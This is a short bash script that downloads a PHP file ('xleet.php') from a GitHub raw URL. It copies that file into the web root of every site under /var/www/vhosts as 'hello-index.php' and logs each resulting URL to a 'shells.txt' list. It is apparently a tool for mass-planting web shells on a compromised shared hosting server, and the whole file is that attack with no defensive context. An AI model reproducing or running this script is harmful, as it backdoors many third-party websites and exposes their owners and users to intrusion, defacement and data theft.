#!/bin/bash
#love_betohat_"BAH"
wget https://raw.githubusercontent.com/BETO-2FA/TXT-SOURCE/main/xleet.php -O /root/egy-batats.php
mkdir /tmp/hello-index
ls -la /var/www/vhosts/ | awk '{print $9}' > /tmp/betobeh
for i in `more /tmp/betobeh`
do
                shell='hello-index.php'
                cat /root/egy-batats.php > /var/www/vhosts/$i/httpdocs/$shell
                echo " [*] $i -> Done"
                echo "https://$i/$shell" >> /var/www/vhosts/shells.txt
done
